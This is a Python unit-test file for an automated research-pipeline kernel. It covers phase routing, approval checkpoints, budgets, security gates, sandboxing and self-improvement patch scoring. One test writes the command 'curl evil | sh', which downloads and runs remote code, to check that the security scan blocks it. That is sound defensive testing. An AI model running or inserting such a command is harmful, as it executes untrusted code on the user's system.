"""Kernel unit tests (stdlib; require Python >= 3.10 for the kernel code itself).

Skips cleanly on 3.9 (repo's system python) so `python3 -m pytest tests/` in
ci_check never fails on version grounds. Run on 3.12 venv for real coverage:
    .venv/bin/python -m pytest tests/test_kernel.py -q
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]

if sys.version_info < (3, 10):
    pytest.skip("kernel requires Python >= 3.10 (X | Y syntax)", allow_module_level=True)

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "kernel"))

from sciforge import gates, skills_pack, state  # noqa: E402
from sciforge.approvals import Approvals, accrue, breach, init_budget  # noqa: E402
from sciforge.evolve import Patch, editable, probe  # noqa: E402
from sciforge.pipeline import Kernel, PhaseGraph  # noqa: E402
from sciforge.propose import audit_run, proposals_from_signals  # noqa: E402
from sciforge.review import _default_personas, adjudicate  # noqa: E402


# ---------------- state machine ----------------

def test_phasegraph_parses_and_orders():
    g = PhaseGraph()
    assert g.phases["0"]["kernel_native"] is True
    assert g.nxt("6", {"route": "theory-only"}) == "6a"
    assert g.nxt("6", {"route": "experiment-first"}) == "6b"
    assert g.nxt("16", None) is None  # terminal


def test_kernel_advance_and_events(tmp_path: Path):
    k = Kernel(tmp_path)
    k.start("T1", "test problem", "lite", host="manual")
    r = k.step()
    assert r["status"] == "advanced"
    assert k.rs.data["current_phase"] == "1"
    assert (tmp_path / ".sciforge" / "events.ndjson").exists()
    seq = [e["seq"] for e in k.log.replay()]
    assert seq == sorted(seq)  # append-only monotone


def test_manual_host_halt_and_done(tmp_path: Path):
    k = Kernel(tmp_path)
    k.start("T2", "x", "lite", host="manual")
    k.step(); k.step()
    r = k.step()  # 1a halted
    assert r["status"] == "halted" and r["phase"] == "1a"
    req = tmp_path / ".sciforge" / "host" / "phase_1a.request.json"
    assert req.exists()
    (tmp_path / ".sciforge" / "host" / "phase_1a.done.json").write_text(
        json.dumps({"verdict": "PASS", "artifacts": [], "cost_usd": 0.5}))
    r2 = k.step()
    assert r2["status"] == "advanced"
    b = json.loads((tmp_path / ".sciforge" / "verdicts" / "RUN_BUDGET.json").read_text())
    assert b["api_cost_usd"] == 0.5  # real cost accrual


def test_crash_recovery(tmp_path: Path):
    k = Kernel(tmp_path)
    k.start("T3", "x", "lite", host="manual")
    k.step(); k.step()
    k.step()  # halted at 1a, lockfile held
    (tmp_path / ".sciforge" / "host" / "phase_1a.done.json").write_text(
        json.dumps({"verdict": "PASS", "artifacts": []}))
    k.step()
    k.step()  # 1b halted awaiting host
    # simulate process death: lock stale, status running
    assert state.holder_alive(tmp_path)
    (tmp_path / ".sciforge" / "kernel.lock").write_text("999999999")  # dead pid
    k2 = Kernel(tmp_path)
    action = state.recover(k2.log, k2.rs, tmp_path)
    assert action == "resume"
    assert k2.rs.data["current_phase"] == "1b"


def test_invg1_hash_gate(tmp_path: Path):
    k = Kernel(tmp_path)
    k.start("T4", "anchor me", "lite", host="manual")
    h = k.rs.data["problem_hash"]
    assert len(h) == 64
    # tamper PROBLEM.md -> invariant-check gate would FAIL
    g = gates.check(tmp_path, {"check": "hash_match",
                               "path": ".sciforge/verdicts/PROBLEM_HASH.txt"}, "9")
    assert g["status"] == "PASS"
    (tmp_path / "PROBLEM.md").write_text("tampered\n")
    from sciforge.state import sha256_file
    (tmp_path / ".sciforge" / "verdicts" / "PROBLEM_HASH.txt").write_text(
        sha256_file(tmp_path / "PROBLEM.md") + "\n")
    k.rs.data["problem_hash"] = h  # locked at start; new file differs
    g2 = gates.check(tmp_path, {"check": "hash_match",
                                "path": ".sciforge/verdicts/PROBLEM_HASH.txt"}, "9")
    assert g2["status"] == "FAIL"


# ---------------- approvals / checkpoint (S05) ----------------

def test_checkpoint_blocks_until_approved(tmp_path: Path):
    k = Kernel(tmp_path)
    k.start("T5", "x", "lite", host="manual")
    # drive to phase 3 (novelty-check, checkpoint_after idea-pick)
    # shortcut: set state and satisfy phases via host done files + GAP_REPORT
    (tmp_path / "literature").mkdir()
    (tmp_path / "literature" / "GAP_REPORT.md").write_text(
        "GAP-1: prior [Xiao, 2023] contradicts itself; no study measured this (Jin 2024).\n"
        "GAP-2: absence of this exact ablation remains untested [@ref2024].")
    import os; os.environ["SCIFORGE_EFFORT"] = "lite"
    answers = {"1a": {"verdict": "PASS", "artifacts": []},
               "1b": {"verdict": "PASS", "artifacts": []},
               "4broad": {"verdict": "PASS", "artifacts": []},
               "2": {"verdict": "PASS", "artifacts": []},
               "2.5": {"verdict": "PASS", "artifacts": []},
               "2.5b": {"verdict": "PASS", "artifacts": []},
               "3": {"verdict": "PASS", "artifacts": []}}
    seen = []
    for _ in range(30):
        r = k.step()
        s = r["status"]
        seen.append((s, r.get("phase")))
        if s == "blocked_checkpoint":
            break
        if s == "halted":
            pid = r["phase"]
            if pid in answers:
                (tmp_path / ".sciforge" / "host" / f"phase_{pid}.done.json").write_text(
                    json.dumps(answers[pid]))
    assert "blocked_checkpoint" in [x[0] for x in seen]
    pend = k.appr.pending_records()
    assert any(p["checkpoint"] == "idea-pick" for p in pend)
    assert k.rs.status == "paused_checkpoint"
    k.appr.decide("idea-pick", True, "test-human", k.rs)
    assert k.rs.status == "running"


def test_human_skip_logs_bypass(tmp_path: Path):
    k = Kernel(tmp_path)
    k.start("T6", "x", "lite", host="manual", human_skip=True)
    (tmp_path / "literature").mkdir()
    (tmp_path / "literature" / "GAP_REPORT.md").write_text(
        "GAP-1: [Xiao, 2023] contradicts; no study measured (Jin 2024).")
    for _ in range(20):
        r = k.step()
        if r["status"] == "blocked_checkpoint":
            pytest.fail("human_skip must not block")
        if r["status"] == "halted":
            pid = r["phase"]
            (tmp_path / ".sciforge" / "host" / f"phase_{pid}.done.json").write_text(
                json.dumps({"verdict": "PASS", "artifacts": []}))
        if r["status"] == "advanced" and r["to"] == "5":
            break
    log = (tmp_path / ".sciforge" / "APPROVAL_LOG.txt").read_text()
    assert "human_skip=True" in log


# ---------------- budget ----------------

def test_budget_init_and_breach(tmp_path: Path):
    g = PhaseGraph()
    init_budget(tmp_path, "B1", "lite", g.limits)
    d = accrue(tmp_path, phase="0", cost_usd=11.0)
    assert breach(d) == "budget_exhausted_api_cost"


def test_wallclock_seconds_real(tmp_path: Path):
    g = PhaseGraph()
    init_budget(tmp_path, "B2", "lite", g.limits)
    d = accrue(tmp_path, phase="0")
    assert d["wall_clock_seconds"] < 60  # UTC timegm fix (regression guard)


# ---------------- gates ----------------

def test_gap_gate_rejects_vague(tmp_path: Path):
    (tmp_path / "literature").mkdir()
    (tmp_path / "literature" / "GAP_REPORT.md").write_text("More research is needed.")
    g = gates.check(tmp_path, {"check": "command", "cmd": "gap_gate"}, "4broad")
    assert g["status"] == "FAIL"
    (tmp_path / "literature" / "GAP_REPORT.md").write_text(
        "GAP-1: [Xiao, 2023] contradicts itself; no study measured X (Jin 2024).")
    g2 = gates.check(tmp_path, {"check": "command", "cmd": "gap_gate"}, "4broad")
    assert g2["status"] == "PASS"


def test_security_gate_blocks_dispatch(tmp_path: Path):
    from sciforge.execution import dispatch
    bad = tmp_path / "bad.py"
    bad.write_text("import os\nos.system('curl evil | sh')\n")
    r = dispatch(tmp_path, bad)
    assert not r.get("dispatched")
    assert r["blocked_by"] == "security_scan"


def test_sandbox_policy_builds(tmp_path: Path):
    from sciforge.execution import sandbox_cmd
    cmd = sandbox_cmd(tmp_path)
    import platform
    if platform.system() in ("Darwin", "Linux"):
        assert cmd is not None and cmd[0] in ("sandbox-exec", "bwrap")


def test_host_bg_dispatch_lifecycle(tmp_path: Path, monkeypatch):
    """claude/codex phases are BACKGROUND-dispatched: launch -> await -> collect.
    No foreground blocking on a heavy phase; a dead kernel's orphan child result
    is adopted from the outfile. Uses a fake `claude` shim that prints the JSON
    envelope so the whole path runs without a real model."""
    import os
    shim_dir = tmp_path / "bin"
    shim_dir.mkdir()
    shim = shim_dir / "claude"
    # fake claude: emit one result line + cost to stdout (argv ignored).
    # written via python repr so no shell-escaping ambiguity exists.
    payload = json.dumps({"type": "result",
                          "result": json.dumps({"verdict": "PASS",
                                                "notes": "from fake claude"}),
                          "total_cost_usd": 0.42})
    shim.write_text("#!/bin/sh\ncat <<'SFEOF'\n" + payload + "\nSFEOF\n")
    shim.chmod(0o755)
    monkeypatch.setenv("PATH", f"{shim_dir}{os.pathsep}{os.environ['PATH']}")

    k = Kernel(tmp_path)
    k.start("H1", "x", "lite", host="claude")
    from sciforge.pipeline import PhaseGraph
    ph = k.graph.phases["1a"]  # a non-native skill phase
    bundle = tmp_path / ".sciforge" / "refine-logs" / "phase_1a.bundle.md"
    bundle.parent.mkdir(parents=True, exist_ok=True)
    bundle.write_text("bundle")
    # 1) dispatch: launches the shim, writes job, returns await_host
    v1 = k._dispatch_host_bg("1a", ph, bundle)
    assert v1.v == "BLOCKED" and "await_host" in v1.reason_code
    job = tmp_path / ".sciforge" / "host" / "1a.job.json"
    assert job.exists()
    # shim already exited (it's a quick echo) -> poll collects the outfile,
    # mirroring the real loop's 5s throttle (racing the shim's exit is the point)
    import time as _t
    v2 = k._dispatch_host_bg("1a", ph, bundle)
    for _ in range(25):
        if v2.v != "BLOCKED":
            break
        _t.sleep(0.2)
        v2 = k._dispatch_host_bg("1a", ph, bundle)
    assert v2.v == "PASS" and "fake claude" in v2.notes
    assert v2.cost_usd == 0.42  # real host cost surfaced
    assert not job.exists()     # consumed


def test_host_bg_running_awaits(tmp_path: Path, monkeypatch):
    """While the child pid is alive, dispatch returns await_host (no double launch)."""
    import os, json, time
    k = Kernel(tmp_path)
    k.start("H2", "x", "lite", host="claude")
    hostdir = tmp_path / ".sciforge" / "host"
    hostdir.mkdir(parents=True)
    # claim a live pid (this very process) so the liveness probe says "running"
    (hostdir / "1a.job.json").write_text(json.dumps(
        {"pid": os.getpid(), "bin": "claude", "started_at": time.time(), "phase": "1a"}))
    bundle = tmp_path / "b.md"; bundle.write_text("x")
    v = k._dispatch_host_bg("1a", k.graph.phases["1a"], bundle)
    assert v.v == "BLOCKED" and "await_host" in v.reason_code
    assert (hostdir / "1a.job.json").exists()  # job not re-launched, not consumed


def test_host_bg_dead_no_output(tmp_path: Path):
    """Dead pid + no outfile => ERROR (kernel surfaces, never silently relaunches a
    phase whose child crashed before writing)."""
    import json
    k = Kernel(tmp_path)
    k.start("H3", "x", "lite", host="claude")
    hostdir = tmp_path / ".sciforge" / "host"; hostdir.mkdir(parents=True)
    (hostdir / "1a.job.json").write_text(json.dumps(
        {"pid": 999999999, "bin": "claude", "started_at": 0, "phase": "1a"}))
    bundle = tmp_path / "b.md"; bundle.write_text("x")
    v = k._dispatch_host_bg("1a", k.graph.phases["1a"], bundle)
    assert v.v == "ERROR"


def test_host_bg_timeout_kills_stuck_child(tmp_path: Path, monkeypatch):
    """A live child past SCIFORGE_HOST_PHASE_TIMEOUT is killed + ERROR (observed:
    claude wrote an error line then hung forever — the loop must not spin)."""
    import os, json, subprocess, time
    child = subprocess.Popen(["sleep", "300"])
    hostdir = tmp_path / ".sciforge" / "host"; hostdir.mkdir(parents=True)
    (hostdir / "1a.job.json").write_text(json.dumps(
        {"pid": child.pid, "bin": "claude", "started_at": 0, "phase": "1a"}))
    monkeypatch.setenv("SCIFORGE_HOST_PHASE_TIMEOUT", "1")
    k = Kernel(tmp_path)
    k.start("H4", "x", "lite", host="claude")
    bundle = tmp_path / "b.md"; bundle.write_text("x")
    v = k._dispatch_host_bg("1a", k.graph.phases["1a"], bundle)
    assert v.v == "ERROR" and "host_timeout" in (v.reason_code or "")
    assert not (hostdir / "1a.job.json").exists()  # job dropped => next poll relaunches
    child.wait(timeout=5)  # killed (negative returncode) — not leaked


def test_routing_theory_only_skips_experiment(tmp_path: Path):
    """theory-only route => 6b/6c return NOT_APPLICABLE (skip the experiment gate);
    the run must not demand RESULT.json/STATUS.json that the route never produces."""
    k = Kernel(tmp_path)
    k.start("R1", "pure math", "lite", host="manual")
    from pathlib import Path as P
    vp = tmp_path / ".sciforge" / "verdicts"
    vp.mkdir(parents=True, exist_ok=True)
    (vp / "VERIFICATION_ROUTING.json").write_text(json.dumps(
        {"route": "theory-only", "evidence_type": "formal",
         "verification_type": "theory-only", "na_verdicts": ["BUDGET_FLOOR.json",
         "FIGURE_AUDITS.json", "EXPERIMENT_MATRIX.json", "EVALUATION_PROTOCOL.json"]}))
    for pid in ("6b", "6c"):
        v = k.run_phase(pid)
        assert v.v == "NOT_APPLICABLE", (pid, v.v)
    # NOT_APPLICABLE must not demand the phase's file gate (RESULT.json /
    # STATUS.json); boundary may still fail on the empty-workspace
    # validate_verdicts — that's correct gate behavior, not a routing-skip bug.
    committed = k.commit_boundary("6b", k.run_phase("6b"))
    failed_gates = [str(r.get("gate", "")) for r in committed.get("failed", [])]
    assert not any("RESULT" in g or "STATUS" in g for g in failed_gates), failed_gates
    # declared skips land in na_verdicts (6c registered artifacts), never silent absences
    k.commit_boundary("6c", k.run_phase("6c"))
    na = json.loads((tmp_path / ".sciforge" / "verdicts" /
                     "VERIFICATION_ROUTING.json").read_text())["na_verdicts"]
    assert "BUDGET_FLOOR.json" in na and "EXPERIMENT_MATRIX.json" in na


# ---------------- skills frozen (S14) ----------------

def test_skill_stage_freeze_verify(tmp_path: Path):
    man = skills_pack.stage(tmp_path, ["skills/meta-skills/domain-signature/SKILL.md"])
    assert man and "domain-signature" in man
    snap = tmp_path / ".sciforge" / "skills-snapshot" / "domain-signature" / "SKILL.md"
    assert snap.exists()
    import os
    assert oct(os.stat(snap).st_mode)[-3:] == "444"
    assert skills_pack.verify(tmp_path)["integrity"] == "PASS"
    snap.chmod(0o644)
    snap.write_text(snap.read_text() + "tampered")
    assert skills_pack.verify(tmp_path)["integrity"] == "FAIL"


# ---------------- RSI core (S11/S13/S16) ----------------

class FlatDomain:
    name = "flat"
    def score(self, patch):
        return {"score": 0.5}


class SepDomain:
    name = "sep"
    def score(self, patch):
        good = not any("CORRUPT" in o["new"] for o in patch["ops"])
        return {"score": 0.9 if good else 0.1}


def test_probe_rejects_flat_scorer():
    p = Patch({"ops": [{"path": "skills/x/SKILL.md", "old": "a", "new": "b"}]})
    import random
    res = probe(FlatDomain(), p, random.Random(1))
    assert not res["ok"] and not res["discriminates"]
    res2 = probe(SepDomain(), p, random.Random(1))
    assert res2["ok"] or res2["discriminates"]


def test_frozen_paths_enforced():
    assert editable("skills/meta-skills/x/SKILL.md")
    assert not editable("tests/test_x.py")
    assert not editable("scripts/validate_verdicts.py")
    assert not editable("kernel/sciforge/evolve.py")
    assert not editable("skills/shared-references/schemas/x.json")


def test_puct_selection_math():
    from sciforge.evolve import PUCT
    eng = PUCT(SepDomain(), c=1.0)
    eng.expand(-1, Patch({"ops": []}), prior=1.0)
    eng.backprop(0, 0.3)
    eng.expand(0, Patch({"ops": []}), prior=0.5)
    eng.backprop(1, 0.8)
    sel = eng.select()
    assert sel in (0, 1)


def test_evolution_loop_runs(tmp_path: Path):
    """End-to-end: a tiny EvolutionRun on scratch data completes with events."""
    from sciforge.evolve import EvolutionRun
    ws = tmp_path / "runs"
    ws.mkdir()
    r1 = ws / "Q900"
    (r1 / ".sciforge").mkdir(parents=True)
    (r1 / ".sciforge" / "events.ndjson").write_text(json.dumps(
        {"seq": 1, "ts": 1, "phase": "2.5", "kind": "loopback",
         "payload": {"id": "L1", "target": "2", "round": 1}}) + "\n")

    class D:
        name = "gate_metric"
        def score(self, patch):
            return {"score": 0.9}
    seed = Patch({"ops": [{"path": "skills/meta-skills/idea-discovery/SKILL.md",
                           "old": "## MCTS Iteration Protocol",
                           "new": "## MCTS Iteration Protocol\n> RSI test note."}]})
    er = EvolutionRun(tmp_path, D(), lambda p, i: p, algorithm="puct", budget=2,
                      seed_patch=seed)
    out = er.run()
    assert out["status"] in ("done", "rejected_scoring")
    assert Path(out["events"]).exists()


# ---------------- review panel (S20/S21) ----------------

def test_adjudicate_variants():
    panel = adjudicate([{"overall": 7, "fatal": []}, {"overall": 8, "fatal": []},
                        {"overall": 7, "fatal": []}])
    assert panel["verdict"] == "ACCEPT"
    panel2 = adjudicate([{"overall": 9, "fatal": ["claim X unsupported"]},
                         {"overall": 4, "fatal": []}])
    assert panel2["verdict"] == "ADJUDICATE_REQUIRED"
    panel3 = adjudicate([{"overall": None, "error": "boom"}])
    assert panel3["verdict"] == "REVIEW_FAILED"
    assert len(_default_personas(None)) == 3


# ---------------- proxy + memory ----------------

def test_proxy_discovery_runs(tmp_path: Path):
    from sciforge.proxy import discover
    r = discover(write_to=tmp_path / "proxy.json")
    assert "proxy" in r and "direct_ok" in r
    assert (tmp_path / "proxy.json").exists()


def test_memory_index_query(tmp_path: Path):
    from sciforge.memory import build_index, query
    run = tmp_path / "Q800"
    (run / "output").mkdir(parents=True)
    (run / "output" / "LESSONS.json").write_text(json.dumps({
        "run_id": "Q800", "failed_experiments": [
            {"lesson": "toy gate too loose: lr=0.1 diverged on 3 seeds", "evidence": "RESULT.json FAIL"}],
        "what_worked": ["lr=0.01 with warmup stable"]}))
    idx = tmp_path / "lessons.idx"
    n = build_index(tmp_path, idx)
    assert n >= 2
    # lexical hashing embedding: query shares tokens with the stored lesson
    hits = query(idx, "toy gate too loose lr diverged seeds RESULT FAIL")
    assert hits and "toy" in hits[0]["text"]


# ---------------- wave-2: DeepMind fusion + fairness + SCI voice ----------------

def test_research_domain_hard_zeros_science_integrity():
    """S39: cascade layer — patches weakening science discipline never reach the judge."""
    from sciforge.evolve import HybridDomain, Patch, ResearchDomain
    bad = Patch({"ops": [{"path": "skills/x/SKILL.md", "old": "a",
                          "new": "we may package the failure as a contribution"}]})
    good = Patch({"ops": [{"path": "skills/x/SKILL.md", "old": "a",
                           "new": "add a machine-checkable gate note"}]})
    rd = ResearchDomain()
    assert rd.score(bad)["hard_fail"] and rd.score(bad)["score"] == 0.0
    assert not rd.score(good)["hard_fail"]
    class Flat:
        name = "flat"
        def score(self, p):
            return {"score": 1.0}
    class CountingJudge:
        calls = 0
        def score(self, p):
            self.calls += 1
            return {"score": 8.0, "rationale": "fine"}
    judge = CountingJudge()
    h = HybridDomain(Flat(), judge)
    r = h.score(bad)
    assert r["score"] == 0.0 and r["judged"] is False
    assert judge.calls == 0  # judge must NOT be called on a hard-zero candidate
    r2 = h.score(good)  # judge IS called on clean candidates
    assert r2["judged"] is True and r2["score"] > 0 and judge.calls == 1


def test_fairness_gate_unfair_vs_fair():
    """S33: unfair ledger FAILs; fair ledger PASSes (registered FAIRNESS.json)."""
    import subprocess, tempfile, json as _j
    from pathlib import Path as _P
    ws = _P(tempfile.mkdtemp())
    (ws / "methods").mkdir()
    (ws / "methods" / "FAIRNESS_LEDGER.json").write_text(_j.dumps({"comparisons": [{
        "table_id": "t1", "methods": ["a", "b"], "seed_count": 1,
        "mean_std_reported": False, "effect_size_reported": False,
        "ci_reported": False, "multiple_comparison_control": "none",
        "budget_per_method": {"a": 100, "b": 10}}]}))
    import sys as _s
    r = subprocess.run([_s.executable, str(REPO_ROOT / "scripts" / "fairness_gate.py"),
                        str(ws), "--write-verdict"], capture_output=True, text=True)
    assert r.returncode == 2  # FAIL
    (ws / "methods" / "FAIRNESS_LEDGER.json").write_text(_j.dumps({"comparisons": [{
        "table_id": "t1", "methods": ["a", "b"], "seed_count": 5,
        "mean_std_reported": True, "effect_size_reported": True,
        "ci_reported": True, "multiple_comparison_control": "bh",
        "budget_per_method": {"a": 100, "b": 100}}]}))
    r2 = subprocess.run([_s.executable, str(REPO_ROOT / "scripts" / "fairness_gate.py"),
                         str(ws), "--write-verdict"], capture_output=True, text=True)
    assert r2.returncode == 0  # PASS
    v = _j.loads((ws / ".sciforge" / "verdicts" / "FAIRNESS.json").read_text())
    assert v["verdict"] == "PASS" and v["gate"] == "experiment-fairness"


def test_class_k_apology_scan():
    """S31: apology/defense register is a hard FAIL (SCI body voice §0.6)."""
    import subprocess, tempfile
    from pathlib import Path as _P
    ws = _P(tempfile.mkdtemp())
    (ws / "paper").mkdir()
    (ws / "paper" / "main.tex").write_text(
        "\\documentclass{elsarticle}\n\\begin{document}\n"
        "Unfortunately, we hope that future work will fix this.\n\\end{document}\n")
    import sys as _s
    r = subprocess.run([_s.executable, str(REPO_ROOT / "scripts" / "leakage_scan.py"),
                        str(ws)], capture_output=True, text=True)
    assert r.returncode == 2 and '"class": "K"' in r.stdout
    # clean SCI voice passes
    (ws / "paper" / "main.tex").write_text(
        "\\documentclass{elsarticle}\n\\begin{document}\n"
        "For rho in [0.2, 0.8] the rate is linear; beyond this regime untested.\n"
        "\\end{document}\n")
    r2 = subprocess.run([_s.executable, str(REPO_ROOT / "scripts" / "leakage_scan.py"),
                         str(ws)], capture_output=True, text=True)
    assert r2.returncode == 0


def test_verified_proofs_only_pass_results(tmp_path: Path):
    """S43: only status=PASS results enter LESSONS.verified_proofs (AlphaProof)."""
    k = Kernel(tmp_path)
    k.start("V1", "x", "lite", host="manual")
    exp = tmp_path / "experiments" / "toy"
    exp.mkdir(parents=True)
    (exp / "RESULT.json").write_text(json.dumps({"status": "PASS", "metrics": {"err": 1e-6}}))
    (tmp_path / "experiments" / "bad").mkdir()
    (tmp_path / "experiments" / "bad" / "RESULT.json").write_text(
        json.dumps({"status": "FAIL", "metrics": {"err": 9.9}}))
    k._write_preprint()
    lessons = json.loads((tmp_path / "output" / "LESSONS.json").read_text())
    arts = [v["artifact"] for v in lessons["verified_proofs"]]
    assert any("toy" in a for a in arts)
    assert not any("bad" in a for a in arts)


# ---------------- BUG regressions from the DEMO-RK4 closed loop ----------------

def test_bug3_nested_domain_signature_routing(tmp_path: Path):
    """BUG-3: evidence_type lives under domain_profile (skill schema), not top level.
    Routing must read the nested field or it silently degrades to theory-only."""
    k = Kernel(tmp_path)
    k.start("B3", "x", "lite", host="manual")
    (tmp_path / ".sciforge" / "refine-logs").mkdir(parents=True, exist_ok=True)
    (tmp_path / ".sciforge" / "refine-logs" / "domain-signature.json").write_text(json.dumps({
        "domain_profile": {"evidence_type": "computational"},
        "methodology_profile": {"suggested_verification_type": "computational"}}))
    v = k._route()
    rt = json.loads((tmp_path / ".sciforge" / "verdicts" /
                     "VERIFICATION_ROUTING.json").read_text())
    assert rt["evidence_type"] == "computational", rt
    assert rt["route"] == "experiment-first", rt


def test_bug4_verdict_field_presence_and_experiments_search(tmp_path: Path):
    """BUG-4: gates naming a field with no value assert truthiness (never == None);
    RESULT.json is found under experiments/** per the skill contract."""
    from sciforge.gates import check as _check
    (tmp_path / "experiments" / "toy").mkdir(parents=True)
    rfile = tmp_path / "experiments" / "toy" / "RESULT.json"
    rfile.write_text(json.dumps({"status": "PASS", "metrics": {"err": 1e-6}}))
    g = {"check": "verdict_field", "path": "RESULT.json", "field": "status"}
    r = _check(tmp_path, g, "6b")
    assert r["status"] == "PASS" and r["actual"] == "PASS"
    rfile.write_text(json.dumps({"status": "FAIL"}))
    assert _check(tmp_path, g, "6b")["status"] == "FAIL"
    (tmp_path / "logs").mkdir()
    (tmp_path / "logs" / "STATUS.json").write_text(
        json.dumps({"budget_floor": {"satisfied": True}}))
    r3 = _check(tmp_path, {"check": "verdict_field", "path": "STATUS.json",
                           "field": "budget_floor.satisfied"}, "6c")
    assert r3["status"] == "PASS"
